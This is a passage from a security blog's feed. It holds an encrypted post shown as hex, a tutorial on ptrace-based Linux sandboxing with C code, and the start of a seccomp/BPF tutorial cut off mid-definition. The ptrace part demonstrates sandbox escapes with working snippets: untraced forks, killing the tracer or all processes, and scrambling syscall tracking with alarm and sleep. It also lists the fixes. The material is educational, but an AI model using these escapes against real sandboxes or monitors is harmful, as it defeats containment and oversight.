485ab564bd4a5606c13c387b8e0cef84b80a0f8f7127c99e5967b67437a9445b153f0e2bde5f4b6bce1a8edc7ac1dfab94ac3b6635aa04eaece771f2802dee229306cc25b37a35e8e08cec2a0458df79aa08b27e8897ee27b9ae970dfb864d7a587e49ec49a66aaca36ba49f0c14bd3c7292cbfa79aa2647230decde2657bc660669e13d5a251767335f5cd3f5607024efa178fda16531d9950dca9d45244ed42ed3308575486ed0d4af478951d85cd1e5dc255f499a6d2cc4fa13c7226a7d3535ad20b30a6dc1369dbe9e2b40bcd07cc846f2f3dd6b67740489a5ca0345dee632c13980414f60a06b5ac46337b75a315f02bb88f3b9035d585429fedbea107147b7f0a10256d6fab8cb2167f31954a6a1917f1a3b19c7cb7b36458fae35a620d98842083f62b165e2eeb7469fb484cd808d2026e4994254853d47a01e90194d1a8197016cbdcfd4fb1830674e263cd3f4e98ab8e53a20ba91590728e20c55a1ee13e2d7e52c6d63fe92f574ba523d3cad95c6f20292ad208536dc4a8aa2350185481b8f02201a796bb080fbb6e8133fcd2d2d2f29e128dde58c7d9d5dedcfd964cc3b2ebe8bdc5bdca1caab2fff0a7a897559d1cb0c7f69f8b05ce87e5d77b203421c9fcb4678b4b0abc065688db6b7d3f44a47cb8404e61fb3a19fde0ff50b988d72c3d96a9ceef3302ddf7aa1c03de7539c2c965afac8b7253db88c645795304b4400761c99f7e692a1cc4d0e4b82d812fe69da49af04bd4641ac0d2cbca9d6276c2434493b7bcd61d992ef6273a1f5c640d7a57d10932b119eabb79b8e7b41e8a6d4bf09c6f30dadf3bd4bbb0141561232ee79e54568c5e87ed6ac15150c463c2297058f7bdcf89bad3fb32db64d23419985765306ecdf18d7e6f6ea102df0833e61e1bcb61bcf6d5ffceaea9faa8ec09d2dc63c9138d6e8025e33d488d9aa3d283af32b4127194eff0c92087036c8d80ec242229a6107991a96f992c66d689b6263cadeafadd2150f3c0af00be3e71207f6a3ae2bea799eeb63897a00dcaa8792a09cea69efcc0e6854776cd8b6334d4ec0c3f584b949fd2275c96637c1c99fc59b19048e9f8113d641aa530f268768b62634c62f6e27657886e475a8ebd886f034bbb1bdfb1b1bc3ac598cd98aaee415b84123f75d7df9882e9632c7f4f6378331ecc036a161881e8c74912cd236590f6905baef6645b6e83859841c86ba610d26970049d43a2552c736a7b063f83b198764fc04cf15092cff0d49f8be7e3a0d740041b7d1fa07801d994c1006dec51d7461e370155d66f5af380ad3fb0db21df5f43c0cc58e36450e5254b40c29f6f74f4104efb9ac725f93a58644d73cf8e2791e5e4cacbcf15c5693dfd2db01a8dfb1b8d1d974e8e2b4104555aea88aea5a54d36a7323e9a90362f4c1aea875a0186d89384a40a567227bef5f0c6999ae978c2acdf42c4cc7c138c49c3f493c63658d386d99d8c497eb2aecc593d7e28d843b289c3e381edb50a239b12c50d4e2127e3da9d119d7d107b884ac58d3f773a2fc75f693c03db50e5675c97d2cb7e33d5ce7c3da38257fd3d0302c45e7a43e05f2ea3463084dbee25a64be685a6de7915901e4ed1f8036c044013d0024aba6fcf34eb1040db8acb4fc5520c7a4f79c879306f5a95290355d766d5846a858c8ece888f36a781ed38d6f92e50f05b8e8be627cedf14ed1f2e6eb0135051065efe07b5d47ef1e5fb55c6039235e0f3ca80df3b12f6794196a2601fbcad8ec7de809a9f3c5c67b90c86b820eb1601e9eb4787614c6e28930fe1216242ac7619decb77116d567e31684aedae7872ef6fdcfb3b9c94a2ac84aac40a0b10481fc63343b370d117d6b9383587ed828df9499a51d1041b164cf7c30a4082732d743c0a9acd9c35f3080c21094a38c8ea9086cb0ceb99b28ab22ca114b89380ce63ade0ebd74d5537915f42b9c4c360b7183c0e92f95678293b2932ef5cca01f54eaa64ce72e0fbe8e34eb2ac05637f63a8846c01fdcd50d05d2a37977fe797f72b8a810ceb7aa9a8ce3565cda76ca2f5789f439cefb23a67c49864a73692a387ae1ce6474b063cca63ba78cccd3d50f62139fce5cdde94e771fe34824eb039f88c6b4a85eaa4f7305830f52f84d09eee7f7760ec82017aa979a1343897d85d6a67ba6de1827cd6b0c1f4705e474dd1d1e629b0a0da970f4c3073ec737f77f954b9d046a260d8489c7fcb981c88f56022adda86600ca07f0969db782588d50974bf53f444e9d98d8cd5f782cbadac21fa2a98ffbec303b532927d163bd24f836c45f4f6256ef76b57375fb17a3603970dbffcdf9d541e740165c0d6d187cb58282e01d7047f80c0fd83bf0f115cadb239b4d80437ab5c82aa03663d633c5bb37320f83381804b51056703b3a108206e9ad8bff04cb053c1b006e9a700362471c07e0e525bd85f6d340c17aadbed99951a03c06d1b3d8e45fa7e2ca1b69bfc2f3f1a9b318b42b64a407b8c9641bc90595043f061e9694b7f27adcf13edd2adc5600bd02604ecee2233e870309f3ca35fbb9d07df19dc7d303f0672beb9378c949ed7218d497740dd44696f5f2e72cbc440b9b8125f6a81db7c8a0cf8b60062e913a41aaf0d6519deacc3056ab2e72aaccb76e07d08ff925d43ca5e8284bd6dafc2951becf3e4db1fa3240947e38fd251cae5274fefc5f03e0d835d7884c43f79780652ead35a7d009fd6ae2add61386c5d28ed3a2b5a841f0764b467b87e9fa7e798ad371f40518b0eeaee583d796ffdb8f2ee382ce6c935a94fa1b26a2016dff0a8e9d0ae45e0d2bf431403f9133767ef363bd281b31d76f3c09f927c8df285e557fe4b253ae1aebb70607e9b871ad5a319836856104f4a8372b6f933f2c14b29bb58eac68ff71973ca1362addde6f52becf8fd59b6db6c52715306473d04d6633ab23a0678f5f7fc9e606649fa6c61921dba3de072edfdb55b7662b0588f677d9c3927493da1a6e10c79f6e6721c043e7d7482912bbe1c7089dcec0851919f215af7a4810d0075ef8e1cb0271754d6dad7831498630ca8c72eeacaa51388134be7a38496f4624d20a2259972b7bb6fd6edff512b7695f8a435728f70f43d7f21ac9adf20b50e42c929ba0ba3ad1bb114dbf0f440ed9fca048ad6f737325aafe2d604db336f4f36c2de1abd11e16b30bc67bea70a36db23705b109c7ae5905c93136c134cd51ef6102ac8a9d6766b3f3f4344978268d3cd4864ebaa3bdebebd260b3b6400c00e8d9ab616cb7af8b22f7553f6df977ec42effb227aa8b8067579a173d0aa521e066af83372c444dfbb8b65fd76aca8e3ebaef0834ae32764708c478bc3f4e4a054c889b321ba15befc2ca71a6717c7519f166348131d7a16b381e5ada5cd14e75df152ab6ab315b2b9f248fae65012252969f153eff6aff8398b33b49f500ecfa733cd8e5e3514f4d215062ebd44854b2f9e5a1fe3435d7a5297b5d87b9dffa1ac1807536db9c9b2c790d747e91e1b7f5aaa40e30fab4cd674aa664a5022f3a833bb974ae05b6a9e0883e101b8c5ee1bba27cb54d0893bbde5320a7830624907d1f1166a705b85b470344157efc99ea0e1af901e48c3d8e1c538f46c62bee65f181a911bd0932a47f15894e4c9cb92a30566c897cfb9c916ae21db52207f131f514b5cbc7ade03f23c3c5106fc4dea0abb480d84944f0d691e580f2b0887c8b3ef9fa3e58b80f882505f767a2d697a2d96c42128b1d5d0348e6862ae63effc39f0aba6ec9a2b44e847640174ad01161259b487fb50b8d9292e459c034fef1243d3391df8cc1af2933c5c4b6774971860ede36cdfc916545a30a4800b230a9c8d4e0ea64d2fab5c727c0a23b1c7514a09b12f835de7c5519520b9d3c75792ba5dc324e101b42fb045f14539d872d78da3301a8cb6bdf4da860430814abd548293261f0611b1e207f531af1daf768f2fd6a07bb2abee903435a3f92ac9cbc1f25a6b3b2ee35c90187f4bb0e3582df68778b42fa4aabcb605a45184ffacc2f3fc3804b86fbaad8b9f6ff7a5a3ec0ad61b4160a09ba00f0708f93c51c5b6698595dd89a28f07a0f9456a20ee35956da52c179fc9c9a1d4d3cd9a54d1400be44ce4470e758fea581e81f374cc8f190f58b8099a6d9921b7c6eb49e674c0f1a1e5bf672d5ee58525193da44d769e91ead3bd6c49a1bbe0a7d9a11138fed8e2e9a16287527ebc0f605799c267523cc135c6d07960b0311a70d8ed83abee1718bd4e403765f722a8edad82611d6087b80f154ad92545ce83af9d59ecb7b40fbebe8ff0273f5b82406ac99086804ca1a758d9adf622269e8992ae313f88beafbdf8caba2f177e7c8d4a777fbcbeebaafa61fbc54181b70aa5a0276ab94d3809c695e6836dcc441c18594637f59aec6f7d6b32374245b588f50456dd9d49e696cd70201b57973d7bedaa862de47bf9b6e7cf2d583f4d2ca0105d51a015b6067ee5107e00d84e1b86a1ad84820ee93cca3f7e573e9cefa85f90311a63c675cc5c55394b12fb5572f0dd8be30da31a0da570ddc9afbedc36be0d5381c5d0b721441b7c5c7bed457da95f6d9e56f4bbf5868c6af90f4d11aa08a83c7e3cfed45488025396b247bb9758e81d77be2589c96c989c71385c1e4f89126e2e85901f335283606f19c4dfdd3bf5238fe61ce062359a1fa782bcf511def8d695cbbdca50d2093893f87c60207521e76e96c83bb90c34b9a2e44520746c7883a3d743abfa2cfbd84c68ac0894210859ddc66b444de2322fc80c30870ffd4a158217b7ef9c9bce409b1a8beaef14af95ab33360ca632dba9d3c91abc9d99e8c2ee8f180ed4b95a946b6dd1eddab1adff02edde5528607abc27ca45c05ff773cec979708dffcb3b1bcf0134611dfc4c4ad9206aa1d8f678e380509a5a46d351daf33519bac7d82715b179ede2e2b9076d764ae5f53cb61d0a516e9f609e5345ea7e9292ad42b7f8b8504a825659c3130937edc69fa00ca925db262ef976266e22abd7d11ad6fb37775931c609faac2d75551f489ed4f7d860fec236629eee1dcd20a999b7a7ee47c4c0de4b2be656dfa430c490a21b5974557e4f064f8490eb5cf82bc47a30ea7de8d1c17426805cbbb53f38d7292715f6239</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Sorry, the article is encrypted.
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux Sandbox - Ptrace</title>
    <link href="blog.b3ale.cn/2020/04/18/Linux-Sandbox-Ptrace/"/>
    <id>blog.b3ale.cn/2020/04/18/Linux-Sandbox-Ptrace/</id>
    <published>2020-04-18T14:15:40.000Z</published>
    <updated>2020-04-19T13:11:45.246Z</updated>
    
    <content type="html"><![CDATA[<p>ptrace 是一个系统调用，也可以用作实现沙箱。</p><a id="more"></a><h1 id="What-is-Ptrace"><a href="#What-is-Ptrace" class="headerlink" title="What is Ptrace"></a>What is Ptrace</h1><p>ptrace 是一个系统调用，Tracer 进程可以监控和修改 Tracee 进程的运行状态，如内存、寄存器的值等。使用 ptrace 可以让某一进程处于受控状态，所以可以用作实现沙箱，如利用 ptrace 来监控 Tracee 使用哪些系统调用，并禁止 Tracee 使用某些危险的系统调用等。ptrace 使用信号来进行进程间通信：</p><pre><code class="bash">$ kill -l 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP 2) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR11)  SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM2)  SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP3)  SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ4)  SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR5)  SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+36)  SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+87)  SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+138)  SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-129)  SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-710) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-211) SIGRTMAX-1  64) SIGRTMAX</code></pre><h1 id="How-to-trace"><a href="#How-to-trace" class="headerlink" title="How to trace"></a>How to trace</h1><p>ptrace 的作用：</p><ul><li>Tracer 追踪 Tracee 的执行</li><li>拦截特定的事件（TRAP、SYSCALL）</li><li>读写 Tracee 的运行状态，如内存、寄存器的值等</li><li>用来实现 gdb 和 strace</li></ul><p>ptrace 的函数原型如下。其中 <code>request</code> 指明进行的操作，<code>pid</code> 为被追踪的进程（<code>pid</code>、<code>addr</code> 和 <code>data</code> 有时不会派上用场，根据具体情况而定）：</p><pre><code class="cpp">#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;long ptrace(enum __ptrace_request request, pid_t pid,                        void *addr, void *data);</code></pre><p><code>request</code> 有很多定义，这里记录几个常用的（详见 <a href="http://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener">Linux Programmer’s Manual</a>）：</p><ul><li><code>PTRACE_TRACEME</code>：表明该进程会被父进程追踪。<code>pid</code>、<code>addr</code> 和 <code>data</code> 的值被忽略。这也是唯一能被 Tracee 使用的 <code>request</code>，其他的 <code>request</code> 都由 Tracer 指定；</li><li><code>PTRACE_ATTACH</code>：Tracer 向 Tracee 发送 SIGSTOP 信号使其暂停，并对 Tracee 追踪；</li><li><code>PTRACE_SEIZE</code>（从 Linux 3.4 开始有的 <code>request</code>）：追踪指定 <code>pid</code> 的进程，但不会像 <code>PTRACE_ATTACH</code> 一样让 Tracee 暂停。<code>addr</code> 必须为 0，<code>data</code> 指定 ptrace 选项；</li><li><code>PTRACE_DETACH</code>：解除追踪关系，Tracee 将继续运行；</li><li><code>PTRACE_CONT</code>：重启停止的 Tracee 进程，如果 <code>data</code> 不为 0，该值就会被当成对应的 Signal 传给 Tracee；反之不会发送 Signal。<code>addr</code> 的值被忽略；</li><li><code>PTRACE_SYSCALL</code>：在系统调用的入口或是出口处将 Tracee 进程停止并进行追踪。<code>addr</code> 的值被忽略；</li><li><code>PTRACE_PEEKUSER</code>：在 Tracee 的用户内存里获取一个字的数据，其中 <code>addr</code> 是在结构体 <code>user</code>（<code>/usr/include/sys/user.h</code>）中的偏移。</li></ul><h2 id="Trace-Child-Process"><a href="#Trace-Child-Process" class="headerlink" title="Trace Child Process"></a>Trace Child Process</h2><ul><li>先在子进程中调用 <code>ptrace(PTRACE_TRACEME)</code>；</li><li>在父进程中使用 <code>waitpid(pid)</code> 等待；</li><li>然后使用 <code>ptrace(PTRACE_CONT)</code> 继续执行；<ul><li>如果没有遇到 <code>int 0x3</code> 就会一直跑；</li><li>要追 syscall 的时候可以用 <code>ptrace(PTRACE_SYSCALL)</code>。</li></ul></li></ul><p>测试代码如下。子进程被父进程追踪，父进程在等待追踪结束后，重启子进程：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            // ...            ptrace(PTRACE_CONT, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, NULL);    }}</code></pre><h2 id="Trace-syscall"><a href="#Trace-syscall" class="headerlink" title="Trace syscall"></a>Trace syscall</h2><ul><li>使用 <code>ptrace(PTRACE_PEEKUSER)</code> 来读取 CPU；<ul><li>addr 为结构体 <code>user</code> 中的偏移；</li><li><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/asm/user_32.h" target="_blank" rel="noopener"><code>arch/x86/include/asm/user_32.h</code></a>（<code>/usr/include/sys/user.h</code>）</li><li>orig_rax 为系统调用号；</li></ul></li><li>syscall 分别在 enter 和 exit 时各中断一次；<ul><li>exit 的时候可以在 rax 获取返回值。</li></ul></li></ul><p>添加一个 incall 来判断在 syscall 的 enter 和 exit 之间的切换，并在系统调用退出时输出调用号；然后获取 <code>user</code> 结构体中的 <code>orig_rax</code> 字段，即系统调用号：</p><pre><code class="cpp">    int incall = 0;    while (1) {        // ...        long orig_rax = ptrace(PTRACE_PEEKUSER, pid,            offsetof(struct user, regs.orig_rax), 0);        if (incall) {            printf(&quot;nr = %ld\n&quot;, orig_rax);        }        incall = ~incall;        ptrace(PTRACE_SYSCALL, pid, 0, 0);    }</code></pre><h2 id="读取-Tracee-的内容"><a href="#读取-Tracee-的内容" class="headerlink" title="读取 Tracee 的内容"></a>读取 Tracee 的内容</h2><ul><li><code>ptrace(PTRACE_PEEKDATA)</code></li><li>固定读一个字（4 字节）</li></ul><p><code>/bin/ls</code> 中调用了 write 进行输出，可以对 write 进行追踪并获取相应的内容：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        int incall = 0;        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            long orig_rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.orig_rax), 0);            long rsi = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rsi), 0);            long rdx = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rdx), 0);            long rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rax), 0);            //printf(&quot;nr = %ld\n&quot;, orig_rax);            if (incall) {                if (orig_rax == 1) {                    printf(&quot;write(\&quot;&quot;);                    for (int i = 0; i &lt; rdx; i++) {                        int d = ptrace(PTRACE_PEEKDATA, pid,                            rsi + i, 0);                        printf(&quot;%c&quot;, d &amp; 0xff);                    }                }            } else {                if (orig_rax == 1) {                    printf(&quot;\&quot;) = %d\n&quot;, (int)rax);                }            }            incall = ~incall;            ptrace(PTRACE_SYSCALL, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, NULL);    }}</code></pre><p>运行结果：</p><pre><code class="bash">➜  ptrace ./ptracewrite(&quot;a  a.c    escape    escape.c  Makefile  ptrace  ptrace.ca  a.c    escape    escape.c  Makefile  ptrace  ptrace.c&quot;) = 51</code></pre><h1 id="Bypass-Ptrace-Sandbox"><a href="#Bypass-Ptrace-Sandbox" class="headerlink" title="Bypass Ptrace Sandbox"></a>Bypass Ptrace Sandbox</h1><ul><li>摆脱对 syscall 的追踪<ul><li>Fork 脱离 Tracer</li><li>砍掉父进程</li></ul></li><li>绕过 syscall 的检查<ul><li><code>syscall_restart</code> 等造成 incall 计算错误</li></ul></li></ul><h2 id="Escape-by-Fork"><a href="#Escape-by-Fork" class="headerlink" title="Escape by Fork"></a>Escape by Fork</h2><ul><li>只要 ptrace 没有跟踪好 fork、vfork、clone，子进程就不会被 ptrace 跟踪；</li><li>正确的做法是要继续跟好子进程，或者直接禁止 fork。<ul><li>可以设置 <code>PTRACE_O_TRACECLONE</code> 选项，会自动跟踪 clone 出来的新进程。</li></ul></li></ul><p>测试代码如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        int incall = 0;        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            long orig_rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.orig_rax), 0);            if (incall) {                if (orig_rax == 59) {                    printf(&quot;SYS_execve detected\n&quot;);                    kill(pid, SIGKILL);                    exit(0);                }            }            incall = ~incall;            ptrace(PTRACE_SYSCALL, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;./a&quot;, &quot;a&quot;, NULL);    }}</code></pre><p>子进程新 fork 一个进程来执行 execve：</p><pre><code class="cpp">    if (fork()) {        sleep(1);    } else {        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);    }</code></pre><p>运行结果：</p><pre><code class="bash">➜  ptrace ./ptracea  a.c    escape    escape.c  Makefile  ptrace  ptrace.c</code></pre><h2 id="Escape-by-Kill"><a href="#Escape-by-Kill" class="headerlink" title="Escape by Kill"></a>Escape by Kill</h2><ul><li>杀死父进程；<ul><li><code>kill(getppid(), 9);</code>；</li><li>ppid 无法获取时可以尝试 pid-1；</li><li><code>/proc/self/stat</code> 中可以拿到 pid 和 ppid；</li><li><code>kill(-1, 9);</code> 杀死除了自己以外的所有进程。</li></ul></li><li>设置 <code>PTRACE_O_EXITKILL</code> 可以让 Tracer 结束时把所有的 Tracee 杀死。</li></ul><p>在子进程中杀死父进程：</p><pre><code class="cpp">    kill(getppid(), 9);    execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);</code></pre><p>运行效果：</p><pre><code class="bash">➜  ptrace ./ptrace[1]    2211 killed     ./ptracea  a.c  escape  escape.c  Makefile  ptrace  ptrace.c</code></pre><p>用 alarm 和 sleep 可以搅乱 syscall 进出的顺序：</p><pre><code class="cpp">    alarm(1);    sleep(2);    execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);</code></pre><p>加上一条用来判断进出 syscall 的输出：</p><pre><code class="cpp">            printf(&quot;%s %ld\n&quot;, (incall ? &quot;Enter&quot; : &quot;Exit&quot;), orig_rax);</code></pre><p>运行效果如下。在执行 alarm 后会导致 sys_nanosleep（35）由进入了一次，后面会调用一个 sys_restart_syscall（219），大概可能和 syscall 的原理有关。在这之后的 syscall 的顺序就会乱掉：</p><pre><code class="bash">Enter 35Exit 35Enter 35Exit 219Enter 219Exit 59Enter 59</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/" target="_blank" rel="noopener">https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#ptrace" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#ptrace</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ptrace 是一个系统调用，也可以用作实现沙箱。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux Sandbox - Seccomp</title>
    <link href="blog.b3ale.cn/2020/04/17/%5BTODO%5DLinux-Sandbox-Seccomp/"/>
    <id>blog.b3ale.cn/2020/04/17/%5BTODO%5DLinux-Sandbox-Seccomp/</id>
    <published>2020-04-17T02:21:52.000Z</published>
    <updated>2020-04-25T03:38:03.736Z</updated>
    
    <content type="html"><![CDATA[<p>Seccomp 可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。</p><a id="more"></a><h1 id="Seccomp-Sandbox"><a href="#Seccomp-Sandbox" class="headerlink" title="Seccomp Sandbox"></a>Seccomp Sandbox</h1><p>Seccomp（Secure Computing mode）是 Linux 提供的一种沙箱机制，可以用来限制程序可以使用和不可使用的系统调用。简洁、优美是 Seccomp 的优点，但只能支持“纯计算型”代码却使得其应用受到很大限制。比如，Seccomp 模式的进程不能动态分配内存、不能与其它进程使用共享内存、不能使用新的文件描述符、等等。如果要支持具有丰富功能的应用程序，则需要另外的方法来截获并处理其它系统调用。Seccomp 沙箱主要有两种模式，<code>SECCOMP_SET_MODE_STRICT</code> 只运行调用 4 个系统调用 <code>read()</code>、<code>write()</code>、<code>exit()</code>、<code>sigreturn()</code> 四个系统调用，而 <code>SECCOMP_SET_MODE_FILTER</code> 则允许通过 BPF 指定系统调用的黑名单或者白名单。</p><p>Seccomp 本身是一种很安全的技术，但是在 <code>SECCOMP_SET_MODE_FILTER</code> 环境下通常会因为 BPF 使用不正确导致沙箱存在被绕过的可能。</p><ul><li>限制一个程序能够使用的系统调用，可以是黑名单或白名单；</li><li>根据 Filter 的内容决定遇到系统调用时采取的行为，包括 kill、allow、trap 等等；</li><li>Filter 可以做简单的计算、条件判断。</li></ul><blockquote><p>早期直接使用 <code>prctl</code> 来开启 Seccomp。现在已经有 libseccomp 库，可以直接使用 <code>seccomp_init</code>、<code>seccomp_rule_add</code>、<code>seccomp_load</code> 来设定规则。</p></blockquote><h2 id="Seccomp-using-prctl"><a href="#Seccomp-using-prctl" class="headerlink" title="Seccomp using prctl"></a>Seccomp using <code>prctl</code></h2><p>Seccomp 采用 Berkeley Packet Filter（BPF）格式，原本在防火墙（iptables）中用来过滤封包。使用 Seccomp 需要有 <code>CAP_SYS_ADMIN</code> Capability（相当于 root 的权限），非 root 用户则通过设置 PR_SET_NO_NEW_PRIVS 位来获取 <code>CAP_SYS_ADMIN</code> Capability。这样能保证 Seccomp 对所有用户都能起作用，并且会使子进程即 execve 后的进程依然受控。获取 <code>CAP_SYS_ADMIN</code> Capability 后，就可以开启相应的自定义规则。具体的规则定义在参数 <code>prog</code> 中：</p><pre><code class="cpp">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); // 获取 CAP_SYS_ADMIN 权限prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog); // 开启自定义的过滤规则</code></pre><p>接下来看看 <code>prog</code> 对应的结构体 <code>sock_fprog</code> 以及用于过滤系统调用的结构体 <code>sock_filter</code>，主要定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/filter.h" target="_blank" rel="noopener">include/uapi/linux/filter.h</a>（<code>/usr/include/linux/filter.h</code>）中。其中 <code>sock_fprog</code> 第一个成员 <code>len</code> 记录过滤规则的个数；第二个成员 <code>filter</code> 是一个 <code>sock_filter</code> 数组，用于记录相应的过滤规则：</p><pre><code class="cpp">/* *    Try and keep these values and structures similar to BSD, especially *    the BPF code definitions which need to match so you can share filters */struct sock_filter {    /* Filter block */    __u16    code;   /* Actual filter code */    __u8    jt;    /* Jump true */    __u8    jf;    /* Jump false */    __u32    k;      /* Generic multiuse field */};struct sock_fprog {    /* Required for SO_ATTACH_FILTER. */    unsigned short        len;    /* Number of filter blocks */    struct sock_filter __user *filter;};</code></pre><p>为了方便操作 <code>sock_filter</code>，还定义了一组宏：</p><pre><code class="cpp">/* * Macros for filter block array initializers. */#ifndef BPF_STMT#define BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }#endif#ifndef BPF_JUMP#define BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }#endif</code></pre><p>其中在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/bpf_common.h" target="_blank" rel="noopener">include/uapi/linux/bpf_common.h</a>（<code>/usr/include/linux/bpf_common.h</code>）对 code 进行了一系列的定义，包括一些数据操作指令、跳转指令、算术运算指令等等（Winesap 提到程序可以全部用 BPF 的算术运算单元来实现，运行的时间是算在内核里，据说居然可以在 OJ 里绕过时间限制）：</p><pre><code class="cpp">/* Instruction classes */#define BPF_CLASS(code) ((code) &amp; 0x07)#define        BPF_LD        0x00#define        BPF_LDX        0x01#define        BPF_ST        0x02#define        BPF_STX        0x03#define        BPF_ALU        0x04#define        BPF_JMP        0x05#define        BPF_RET        0x06#define        BPF_MISC        0x07/* ld/ldx fields */#define BPF_SIZE(code)  ((code) &amp; 0x18)#define        BPF_W        0x00#define        BPF_H        0x08#define        BPF_B        0x10#define BPF_MODE(code)  ((code) &amp; 0xe0)#define        BPF_IMM        0x00#define        BPF_ABS        0x20#define        BPF_IND        0x40#define        BPF_MEM        0x60#define        BPF_LEN        0x80#define        BPF_MSH        0xa0/* alu/jmp fields */#define BPF_OP(code)    ((code) &amp; 0xf0)#define        BPF_ADD        0x00#define        BPF_SUB        0x10#define        BPF_MUL        0x20#define        BPF_DIV        0x30#define        BPF_OR        0x40#define        BPF_AND        0x50#define        BPF_LSH        0x60#define        BPF_RSH        0x70#define        BPF_NEG        0x80#define        BPF_MOD        0x90#define        BPF_XOR        0xa0#define        BPF_JA        0x00#define        BPF_JEQ        0x10#define        BPF_JGT        0x20#define        BPF_JGE        0x30#define        BPF_JSET        0x40#define BPF_SRC(code)   ((code) &amp; 0x08)#define        BPF_K        0x00#define        BPF_X        0x08</code></pre><p>从某个地址加载数据（数据的大小：<code>BPF_W</code>、<code>BPF_H</code>、<code>BPF_B</code>，地址的类型：<code>BPF_ABS</code>、<code>BPF_IMM</code>）：</p><pre><code class="cpp">BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0)</code></pre><p>然后 Seccomp 的返回值在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h" target="_blank" rel="noopener">include/uapi/linux/seccomp.h</a>（<code>/usr/include/linux/seccomp.h</code>）中有定义，意思也是比较直观的：</p><pre><code class="cpp">/* * All BPF programs must return a 32-bit value. * The bottom 16-bits are for optional return data. * The upper 16-bits are ordered from least permissive values to most. * * The ordering ensures that a min_t() over composed return values always * selects the least permissive choice. */#define SECCOMP_RET_KILL    0x00000000U /* kill the task immediately */#define 